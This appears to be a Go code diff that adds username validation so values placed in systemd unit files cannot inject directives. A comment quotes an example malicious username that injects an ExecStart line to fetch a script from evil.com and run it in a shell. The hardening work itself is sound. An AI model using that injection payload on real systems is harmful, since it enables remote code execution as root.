@@ -52,6 +52,33 @@ func validateProjectName(name string) error {
 	return nil
 }
 
+// usernamePattern is the portable POSIX "name" pattern (NAME_REGEX in
+// /etc/adduser.conf on most distros): a leading lowercase letter or
+// underscore followed by lowercase, digits, underscore, or hyphen,
+// 1 to 32 chars. We deliberately reject uppercase and the trailing
+// `$` Samba-account convention; neither is needed for the VMs that
+// holos drives, and both complicate systemd interpolation.
+//
+// The reason this matters: UnitSpec.User goes straight into `User=`
+// of a generated [Service] block, rendered unquoted (systemd doesn't
+// honor shell quoting in unit files). Without validation a caller
+// supplying "alice\nExecStart=/bin/curl evil.com/shell | sh" would
+// append an attacker-controlled directive to a root-owned unit file.
+// Even a trailing space would silently turn the unit into something
+// systemd parses differently than the operator typed.
+var usernamePattern = regexp.MustCompile(`^[a-z_][a-z0-9_-]{0,31}$`)
+
+func validateSystemUser(name string) error {
+	if name == "" {
+		return errors.New("user is empty")
+	}
+	if !usernamePattern.MatchString(name) {
+		return fmt.Errorf("user %q must match %s (POSIX username, 1-32 lowercase/digits/underscore/hyphen, leading [a-z_])",
+			name, usernamePattern.String())
+	}
+	return nil
+}
+
 // Scope selects between a per-user unit and a host-wide unit.
 type Scope string
 
@@ -315,6 +342,15 @@ func (s UnitSpec) validate() error {
 	case ScopeUser, ScopeSystem:
 	default:
 		return fmt.Errorf("unknown scope %q", s.Scope)
+	}
+	if s.User != "" {
+		// Only system-scope units honor User=, but validate for any
+		// scope: a caller that sets .User on a user-scope unit is
+		// already wrong, and if we change scope handling later we
+		// don't want a previously-accepted bad value sneaking in.
+		if err := validateSystemUser(s.User); err != nil {
+			return err
+		}
 	}
 	return nil
 }
